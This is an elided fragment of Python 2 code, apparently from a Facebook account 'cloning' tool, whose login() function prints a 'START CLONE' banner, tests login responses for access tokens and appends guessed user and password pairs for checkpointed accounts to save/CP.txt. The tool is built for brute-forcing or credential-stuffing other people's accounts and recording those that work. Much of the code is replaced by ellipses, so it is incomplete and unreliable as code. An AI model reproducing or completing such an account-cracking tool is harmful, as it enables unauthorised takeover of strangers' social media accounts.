...
def login():
    ...
    print "\033[1;97m[➊]\x1b[1;93mSTART CLONE\x1b[1;96m ★彡 START CLONING 彡★ "  
    time.sleep(0.05)
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    SYeDs = open('save/CP.txt', 'a')
                    SYeDs.write(k+c+user+pass1+'\n')
                    SYeDs.close()
                    SYeDb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
